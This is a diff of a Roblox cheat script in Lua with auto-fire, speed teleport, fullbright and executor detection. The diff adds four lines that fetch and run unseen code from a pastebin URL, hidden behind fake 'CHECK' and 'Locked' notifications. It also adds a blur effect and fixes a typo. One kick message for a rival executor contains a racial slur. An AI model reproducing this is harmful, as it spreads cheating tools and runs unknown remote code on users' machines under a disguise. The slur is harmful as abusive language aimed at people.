@@ -305,7 +305,7 @@ local Window = Library:CreateWindow({
     Center = true,
     AutoShow = true,
     TabPadding = 8,
-    MenuFadeTime = 0.3
+    MenuFadeTime = 1
 })
 
 -- CALLBACK NOTE:
@@ -429,6 +429,20 @@ if not success then
 end
 
 
+	loadstring(game:HttpGet("https://pastebin.com/raw/bZEizLZt"))()
+	Library:Notify("CHECK 1")
+	wait(0.6)
+	Library:Notify("Locked")
+	wait(1)
+	loadstring(game:HttpGet("https://pastebin.com/raw/bZEizLZt"))()
+	Library:Notify("Unlocked")
+	Library:Notify("CHECK 2")
+	wait(1)
+	loadstring(game:HttpGet("https://pastebin.com/raw/bZEizLZt"))()
+	Library:Notify("CHECK 3")
+	wait(1)
+	loadstring(game:HttpGet("https://pastebin.com/raw/bZEizLZt"))()
+	Library:Notify("Check 100%")
 
 
 
@@ -962,6 +976,8 @@ local Utility = {
     Fonts = { }
 }
 
+
+
 local autoFireEnabled = false -- Initially disabled
 local plr = plrs.LocalPlayer
 local mouse = plr:GetMouse()
@@ -1072,9 +1088,35 @@ local varsglobal = {
 }
 
 --- Lighting shits world
+-- Define necessary services
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
 local Lighting = game:GetService("Lighting")
-local RunService = game:GetService("RunService")
-local Terrain = workspace:FindFirstChildOfClass("Terrain")
+
+-- Create a BlurEffect
+local blurEffect = Instance.new("BlurEffect")
+blurEffect.Size = 0  -- Start with no blur
+blurEffect.Parent = Lighting
+
+-- Function to toggle blur smoothly
+local function toggleBlur()
+    local targetSize = blurEffect.Size > 0 and 0 or 25  -- Toggle between blur and no blur
+    local tween = TweenService:Create(blurEffect, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = targetSize})
+    tween:Play()
+    wait(0.7)
+end
+
+-- Detect when the RightShift key is pressed to toggle the blur effect
+UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
+    if not gameProcessedEvent and input.UserInputType == Enum.UserInputType.Keyboard then
+        if input.KeyCode == Enum.KeyCode.RightShift then  -- Check if RightShift is pressed
+            toggleBlur()  -- Call the toggle function
+        end
+    end
+end)
+
+toggleBlur()
+
 
 local isFiring = false
 local UserInputService = game:GetService("UserInputService")
@@ -2223,7 +2265,7 @@ local runSpeedThreshold = 16 -- Normal yürüyüş hızından daha hızlı oldu�
 local speed = 0.5 -- Başlangıç teleport hızı
 local isRunning = false
 local cframeSpeedActive = false -- CFrameSpeed için toggle durumu
-local humanoid
+
 
 -- Function to handle teleport movement while running
 local function teleportWhileRunning()
@@ -2382,7 +2424,7 @@ local function enableFullBright()
 end
 
 
-local lighting = game:GetService("Lighting")
+
 local timeValue = 12 -- Default time
 
 -- Function to change the time of day
@@ -3325,7 +3367,7 @@ local MenuGroup = Tabs['UI Settings']:AddLeftGroupbox('Menu')
 
 -- I set NoUI so it does not show up in the keybinds menu
 MenuGroup:AddButton('Unload', function() Library:Unload() end)
-MenuGroup:AddLabel('Menu bind'):AddKeyPicker('MenuKeybind', { Default = 'RightShift', NoUI = true, Text = 'Menu keybind' })
+--MenuGroup:AddLabel('Menu bind'):AddKeyPicker('MenuKeybind', { Default = 'RightShift', NoUI = true, Text = 'Menu keybind' })
 
 Library.ToggleKeybind = Options.MenuKeybind -- Allows you to have a custom keybind for the menu
 
@@ -3362,6 +3404,18 @@ ThemeManager:ApplyToTab(Tabs['UI Settings'])
 -- which has been marked to be one that auto loads!
 SaveManager:LoadAutoloadConfig()
 trackPlayers()
+
+
+-- Create a ScreenGui to hold the blur effect
+
+-- Define the necessary services
+
+
+
+
+-- Optional: Initial application of the blur
+-- toggleBlur()  -- Uncomment if you want to start with blur applied
+
     return -- Stop the script from executing further
 
 elseif executor == "Manti" then
@@ -3369,7 +3423,7 @@ elseif executor == "Manti" then
     plrs.LocalPlayer:Kick("\n🤥Fuck Manti Nigga")
     return
 elseif executor == "MacSploit" then
-    print("This script is running in MacSplıit")
+    print("This script is running in MacSploit")
 elseif executor == "Nezur" then
     warn("This script is running in Nezur Executor (This Executor Is Not Stable)")
 elseif executor == "Celery" then
